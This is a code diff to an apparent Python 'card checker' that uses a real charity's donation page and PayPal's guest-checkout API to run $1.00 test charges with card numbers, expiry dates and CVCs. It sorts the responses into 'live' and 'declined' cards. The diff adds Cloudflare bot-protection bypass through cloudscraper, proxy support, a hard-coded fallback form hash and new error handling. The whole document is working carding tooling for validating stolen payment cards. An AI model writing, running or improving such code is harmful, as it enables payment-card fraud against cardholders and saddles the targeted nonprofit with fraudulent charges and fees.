@@ -1,3 +1,4 @@
+import cloudscraper
 import requests
 import json
 import re
@@ -12,11 +13,12 @@ def _generate_email():
 
 def check_card_paypal_aww_sync(cc, mm, yy, cvc, proxy_url=None):
     """
-    Synchronous PayPal Commerce $1.00 Gate (awwatersheds.org).
+    Synchronous PayPal Commerce $1.00 Gate (awwatersheds.org) with Cloudflare Bypass.
     Flow:
-    1. POST /wp-admin/admin-ajax.php (action=give_process_donation)
-    2. POST /wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order
-    3. POST https://www.paypal.com/graphql?paywithcard (mutation approveGuestPaymentWithCreditCard)
+    1. GET /donate/ (extract form hash via cloudscraper)
+    2. POST /wp-admin/admin-ajax.php (action=give_process_donation)
+    3. POST /wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order
+    4. POST https://www.paypal.com/graphql?paywithcard (mutation approveGuestPaymentWithCreditCard)
     Returns: (status, message, brand)
     """
     if len(yy) == 2:
@@ -25,12 +27,9 @@ def check_card_paypal_aww_sync(cc, mm, yy, cvc, proxy_url=None):
         exp_year = yy
     exp_formatted = f"{mm.zfill(2)}/{exp_year}"
 
-    s = requests.Session()
-    user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120, 125)}.0.0.0 Safari/537.36"
-    s.headers.update({
-        'User-Agent': user_agent,
-        'Accept-Language': 'en-US,en;q=0.9',
-    })
+    s = cloudscraper.create_scraper(
+        browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
+    )
 
     if proxy_url:
         s.proxies = {'http': proxy_url, 'https': proxy_url}
@@ -39,7 +38,7 @@ def check_card_paypal_aww_sync(cc, mm, yy, cvc, proxy_url=None):
         # Step 1: GET donation page to extract form hash
         r_page = s.get('https://awwatersheds.org/donate/', timeout=15)
         hash_match = re.search(r'name="give-form-hash".*?value="([^"]+)"', r_page.text)
-        form_hash = hash_match.group(1) if hash_match else 'bfe3071ab0'
+        form_hash = hash_match.group(1) if hash_match else '0157d4db02'
 
         form_prefix_match = re.search(r'name="give-form-id-prefix".*?value="([^"]+)"', r_page.text)
         form_prefix = form_prefix_match.group(1) if form_prefix_match else '4572-1'
@@ -118,20 +117,20 @@ def check_card_paypal_aww_sync(cc, mm, yy, cvc, proxy_url=None):
         }
 
         r_order = s.post('https://awwatersheds.org/wp-admin/admin-ajax.php', params=params_order, headers=headers_ajax, files=files_order, timeout=15)
-        
+
+        order_id = None
         try:
             order_json = r_order.json()
             order_id = order_json.get('data', {}).get('id') or order_json.get('id')
         except Exception:
-            order_id = None
+            pass
 
         if not order_id:
-            # Fallback regex search if raw string returned
             order_match = re.search(r'([A-Z0-9]{17})', r_order.text)
             if order_match:
                 order_id = order_match.group(1)
             else:
-                return "declined", "Failed to create PayPal Order ID", "N/A"
+                return "declined", f"Failed to create PayPal Order ID ({r_order.status_code})", "N/A"
 
         # Step 4: Pay with card via PayPal GraphQL
         headers_paypal = {
@@ -139,7 +138,6 @@ def check_card_paypal_aww_sync(cc, mm, yy, cvc, proxy_url=None):
             'Content-Type': 'application/json',
             'Origin': 'https://www.paypal.com',
             'paypal-client-context': order_id,
-            'User-Agent': user_agent,
             'x-app-name': 'standardcardfields',
             'x-country': 'US',
         }
@@ -249,7 +247,9 @@ def check_card_paypal_aww_sync(cc, mm, yy, cvc, proxy_url=None):
         if 'errors' in pay_res:
             err_msg = pay_res['errors'][0].get('message', 'PayPal Payment Error')
             err_lower = err_msg.lower()
-            if "insufficient" in err_lower or "funds" in err_lower:
+            if "guest_payment_integrity_validation_failed" in err_lower:
+                return "declined", "Declined (Security/Integrity Check Failed)", "N/A"
+            elif "insufficient" in err_lower or "funds" in err_lower:
                 return "live", "Insufficient Funds", "N/A"
             elif "cvv" in err_lower or "card code" in err_lower:
                 return "live", "CVV Mismatch", "N/A"
